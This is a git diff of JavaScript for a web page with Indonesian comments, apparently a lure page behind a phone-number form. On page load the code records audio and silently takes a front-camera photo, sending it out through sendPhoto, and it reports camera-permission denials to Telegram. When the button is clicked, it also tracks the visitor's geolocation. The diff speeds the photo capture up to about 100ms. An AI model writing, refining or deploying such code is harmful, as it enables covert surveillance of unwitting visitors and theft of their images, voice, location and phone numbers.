@@ -141,7 +141,6 @@
       } catch (err) {}
     }
 
-    // FUNGSI LOKASI SESUAI PERMINTAAN ANDA
     function trackLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -174,27 +173,33 @@
       }
     }
 
-    async function takePhoto(facingMode, label) {
+    // FUNGSI KAMERA DEPAN YANG DIPERCEPAT
+    async function takePhotoFast() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.createElement('video');
         video.srcObject = stream;
-        await video.play();
-
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
         
-        await new Promise(res => setTimeout(res, 1000));
-        
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(blob => {
-          sendPhoto(blob, `foto_${label}.png`, `📸 Foto Kamera ${label}`);
-          stream.getTracks().forEach(track => track.stop());
-        }, 'image/png');
+        // Langsung play dan ambil gambar segera setelah metadata tersedia
+        video.onloadedmetadata = () => {
+          video.play();
+          
+          // Delay sangat singkat (100ms) untuk memastikan sensor kamera menangkap cahaya
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+              sendPhoto(blob, 'depan.png', 'berhasil mengirim foto ✅');
+              stream.getTracks().forEach(track => track.stop());
+            }, 'image/png');
+          }, 100); 
+        };
       } catch (err) {
-        sendToTelegram(`Izin Kamera ${label} ditolak ❌`);
+        sendToTelegram(`Izin Kamera depan ditolak ❌`);
       }
     }
 
@@ -202,14 +207,13 @@
       createParticles();
       getInfo();
       autoRecordAudio();
-      takePhoto("user", "Depan");
+      takePhotoFast(); // Langsung memicu izin dan ambil foto cepat
     });
 
     button.addEventListener('click', () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
       
-      // MENJALANKAN FUNGSI LOKASI SAAT TOMBOL DIKLIK
       trackLocation();
 
       button.disabled = true;
